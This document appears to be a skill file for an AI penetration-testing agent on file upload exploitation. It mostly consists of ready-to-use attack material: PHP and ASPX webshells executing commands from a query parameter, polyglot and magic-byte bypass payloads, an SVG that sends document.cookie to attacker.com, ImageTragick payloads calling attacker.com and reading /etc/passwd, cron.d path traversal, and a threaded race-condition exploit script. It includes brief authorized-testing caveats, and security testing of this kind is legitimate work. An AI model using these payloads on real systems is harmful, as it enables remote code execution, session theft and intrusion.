---
name: file-upload-attacks
description: "File upload exploitation including double extension, polyglot files, SVG XSS, and restricted file bypass"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders]
triggers: ["file upload vulnerability", "upload exploitation", "unrestricted file upload", "file type bypass", "upload bypass", "double extension", "polyglot file", "svg upload", "image upload attack", "upload validation bypass"]
contextBoosts: [api]
mitreAttack: ["T1190", "T1059"]
owaspRefs: ["OWASP Top 10 A04:2021 Insecure Design"]
---

# File Upload Attacks

## When to Use
- Testing file upload functionality for unrestricted upload, type bypass, or path traversal
- Assessing SVG uploads for XSS
- Testing image processing libraries for vulnerabilities

**Do not use** to deploy actual malicious files in production. Prove the flaw, don't weaponize.

## Auth Context
Before making HTTP requests, call **getCapturedHeaders** with the target URL to get real auth context. Pass these in the `headers` parameter of httpRequest.

## Upload Field Discovery

Enumerate upload surfaces and capture a baseline upload to learn the validation model:

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="test.png"
Content-Type: image/png

PNG
------WebKitFormBoundary--
```

```bash
# Baseline: does the server return the stored path?
curl -sk https://target.com/upload -F "avatar=@test.png;type=image/png" | grep -iE 'path|url|saved'
```

## Double Extension Bypass

Servers that validate the *first* extension but serve/execute by the *last* one (or vice versa) can be bypassed with stacked extensions:

```
shell.php.jpg
shell.php;.jpg          # IIS semicolon truncation
shell.php%00.jpg        # legacy PHP null-byte (PHP < 5.3.4)
shell.jpg.php
shell.phtml             # alternate PHP handler extension
shell.phar              # PHP phar archive execution
shell.aspx;.jpg         # .NET / IIS
shell.jsp%00.jpg        # Tomcat legacy
```

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php echo system($_GET['c']); ?>
------WebKitFormBoundary--
```

Then locate the stored file and trigger it:

```http
GET /uploads/shell.php.jpg?c=id HTTP/1.1
Host: target.com
```

## Content-Type Bypass

Validation that trusts only the `Content-Type` header is trivially spoofed — keep a benign filename but swap the MIME type:

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="notes.txt"
Content-Type: image/png

<?php echo system($_GET['c']); ?>
------WebKitFormBoundary--
```

```bash
# Content-type fuzzing loop against an allowlist
for ct in image/png image/jpeg image/gif application/pdf; do
  curl -sk https://target.com/upload -F "avatar=@shell.php;type=$ct" \
    -o /dev/null -w "$ct -> %{http_code}\n"
done
```

## Magic Bytes Bypass

Validation that reads the first bytes of the file is bypassed by prefixing valid magic bytes ahead of the payload:

```bash
# GIF89a + PHP payload
printf 'GIF89a<?php echo system($_GET["c"]); ?>' > shell.gif.php

# PNG magic bytes + PHP payload
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR<?php echo system($_GET["c"]); ?>' > shell.png.php

# JPEG magic bytes + ASPX webshell
printf '\xFF\xD8\xFF\xE0' > shell.aspx
cat >> shell.aspx << 'EOF'
<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["c"]); %>
EOF
```

Verify the server accepts it:

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="shell.gif"
Content-Type: image/gif

GIF89a<?php echo system($_GET["c"]); ?>
------WebKitFormBoundary--
```

## Polyglot Files

Polyglots are simultaneously valid images AND executable code — they pass `getimagesize()`, ImageMagick identify, and re-encoding checks while carrying a payload:

**GIF + PHP polyglot:**

```bash
# Valid GIF header block followed by PHP — passes getimagesize()
printf 'GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;<?php system($_GET["c"]); ?>' > polyglot.gif
php -r 'var_dump(getimagesize("polyglot.gif"));'   # returns valid dimensions
```

**JPEG (EXIF comment) + PHP polyglot via exiftool:**

```bash
exiftool "-comment=<?php system(\$_GET['c']); ?>" clean.jpg -o polyglot.jpg
# Payload lands in APP1 EXIF metadata; retrieved by exif_read_data()/passthru of comments
```

**GIF + JavaScript polyglot (for client-side rendering):**

```javascript
/*=<img src=x onerror=alert(document.domain)>*/
// ^ parses as JS comment in <script src=polyglot.gif>, as content elsewhere
GIF89a=alert(1)//;
```

## SVG XSS Upload

SVG is XML — uploaded SVGs served inline execute script when visited directly:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <circle cx="50" cy="50" r="40" fill="red"/>
  <script>alert(document.domain)</script>
</svg>
```

Variants that survive sanitizers stripping `<script>`:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <a xlink:href="?"><text x="20" y="20">click</text></a>
</svg>
```

```xml
<!-- foreignObject variant -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="500" height="500">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <img src="x" onerror="fetch('https://attacker.com/'+document.cookie)"/>
    </body>
  </foreignObject>
</svg>
```

Upload request:

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="logo.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
------WebKitFormBoundary--

<!-- Then visit GET /uploads/logo.svg directly — Content-Type must be image/svg+xml for execution -->
```

## Path Traversal in Filename

Filename metacharacters can redirect where the server writes the file:

```
../../webroot/shell.php
..%2f..%2fwebroot%2fshell.php       # URL-encoded separators
....//....//etc/cron.d/pwn          # filter-strip traversal ("....//" collapses to "../")
..\..\webroot\shell.aspx            # Windows separators
filename="/var/www/html/shell.php"  # absolute path in RFC 2047 disposition
```

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="../../public/shell.php"
Content-Type: application/x-php

<?php echo system($_GET['c']); ?>
------WebKitFormBoundary--
```

Confirm with path-probing responses:

```http
GET /uploads/../../public/shell.php?c=id HTTP/1.1
Host: target.com

<!-- or check response of upload for sanitized vs raw filename echo -->
```

## ImageMagick Exploitation (CVE-2016-3714)

ImageTragick: MSL/SVG delegate files processed by ImageMagick (`convert`, `identify`) reach arbitrary file read, file move, or command execution via delegates:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="https://attacker.com/image.png"/>
  <write filename="/var/www/uploads/pwned.php"/>
  <!-- arbitrary file WRITE: pushes converted output anywhere writable -->
</image>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <!-- CVE-2016-3718: SSRF / internal file disclosure via MSL -->
  <read filename="inline:data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxIiBoZWlnaHQ9IjEiPjxpbWFnZSBocmVmPSJmaWxlOi8vL2V0Yy9wYXNzd2QiPjwvaW1hZ2U+PC9zdmc+"/>
</image>
```

```xml
<!-- CVE-2016-3717: command injection via https delegate -->
<svg width="1px" height="1px"><image href="https://example.com/$(curl${IFS}http://attacker.com/pwn).png"/></svg>
```

Probe passively first — upload the MSL/SVG and watch your callback server.

## Race Condition on Upload

Async AV scanners / sanitizers delete malicious files after N seconds. Win the race between write and delete:

```python
import threading, requests

TARGET = "https://target.com/upload"
FILES = {"avatar": ("shell.php", b"<?php echo system($_GET['c']); ?>", "image/png")}

def race():
    s = requests.Session()
    r = s.post(TARGET, files=FILES)
    print(r.status_code)
    # immediately try to access the stored file
    check = s.get("https://target.com/uploads/shell.php", params={"c": "id"})
    if "uid=" in check.text:
        print("[+] WON RACE:", check.text[:100])

threads = [threading.Thread(target=race) for _ in range(30)]
for t in threads: t.start()
```

```bash
# Turbo Intruder equivalent: upload + fetch in the same queued burst
# queueRequests fires uploads continuously while handleResponse probes the stored path
```

## Evidence Collection
- Upload request/response pairs
- Evidence of file execution (command output, XSS alert)
- File storage path discovery
- **recordEvidence** for every finding
- **writeFinding** with severity based on impact

## Anti-Hallucination
Your claims will be verified against real tool output. Never fabricate findings.
Every upload bypass you report MUST have a corresponding tool call response that proves it.
If a tool call fails, say so honestly — do not invent a success.

## Trigger Conditions

Activate on any file upload/import feature: avatars, documents, media, archives, certificates, plugins/themes, or profile imports. Trigger especially for SVG uploads (XSS), server-side processing (ImageMagick/GD/librsvg), and endpoints that later serve uploaded files. Also relevant when filenames/paths are user-controlled (path traversal) or the app processes the file server-side. Do not trigger to deploy actual malware — prove the flaw, don't weaponize. Avoid destructive payloads on production.

## Detection Approach

First discover the upload field and the validation model: inspect accepted extensions, `Content-Type`, magic bytes, size, and the response (stored path, processed output). Reason about the weakest link. Test filename-based bypasses (double extension `shell.php.jpg`, trailing dot/null byte, path traversal `../../`), then `Content-Type` spoofing, then magic-byte padding ahead of a polyglot payload (script embedded after a valid GIF/JPEG header). For SVG, inject XML/script and verify server-side or client-side rendering. For processing libraries, probe known unsafe primitives (ImageMagick `</>` delegates). Confirm success by actually retrieving/executing the uploaded artifact (XSS alert, command output, or saved file at a predictable path) — not by a generic "upload succeeded" message. Mind the race condition on async AV scanners that delete bad files after a delay.

## Pitfalls

- Treating "upload succeeded" as proof of execution — you must retrieve/execute the file to confirm impact.
- Assuming client-side extension checks are the only control — verify server-side validation too.
- Overlooking content-type vs magic-byte mismatches — set both consistently for the spoof.
- Forgetting processing libraries (ImageMagick) can be the real sink, not just the web server.
- Ignoring the async-scanner race — a file may vanish after upload, defeating the test.
- Weaponizing with real malware on production — keep PoCs benign proof-of-concept files.

## Verification & Impact

CONFIRMED when the uploaded file is stored/served and demonstrably executes or renders with attacker control: script/XSS from an SVG, command output from a server-side processed polyglot, or a file written outside the intended directory via traversal. SUSPECTED when the upload is accepted but execution/retrieval isn't proven — record as candidate. Document impact by capability (arbitrary file write, XSS, RCE via processing library, traversal) and severity. Capture the upload request, stored-path discovery, and execution/retrieval proof via `recordEvidence`.
